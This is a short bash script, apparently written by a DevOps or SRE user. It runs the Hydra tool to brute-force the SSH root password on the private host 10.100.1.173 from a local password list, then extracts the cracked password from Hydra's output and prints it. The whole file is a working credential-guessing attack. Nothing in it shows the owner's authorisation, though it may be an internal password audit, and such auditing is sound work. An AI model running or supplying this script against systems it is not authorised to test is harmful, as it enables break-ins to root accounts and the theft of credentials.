#!/bin/bash

# Run Hydra command and save output to a variable
output=$(hydra -l root -P /home/sre-muhfalih/Documents/DEVOPS/CheckingResource/password.txt ssh://10.100.1.173 2>&1)

wait

sleep 10

# Extract the password from the output
password=$(echo "$output" | grep -oP '\[22\]\[ssh\] host: 10\.100\.1\.173\s+login: root\s+password: \K\S+')

# Display the password if found
if [ -n "$password" ]; then
  echo "Password found: $password"
else
  echo "Password not found in output."
fi